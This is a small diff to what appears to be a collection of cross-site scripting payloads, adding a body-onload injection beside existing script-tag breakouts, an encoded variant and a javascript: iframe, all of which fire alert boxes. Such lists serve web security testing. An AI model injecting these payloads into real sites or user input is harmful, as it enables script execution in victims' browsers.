@@ -14,3 +14,4 @@
 - abc`;return+false});});alert`xss`;</script> encoded as abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
 - "<<scr\aaa/src=></script><script>alert("document.domain")</script>"
 - </div><iframe%20src=javascript:alert('1337')>
+- "><body%20onload%3Dalert(1)>
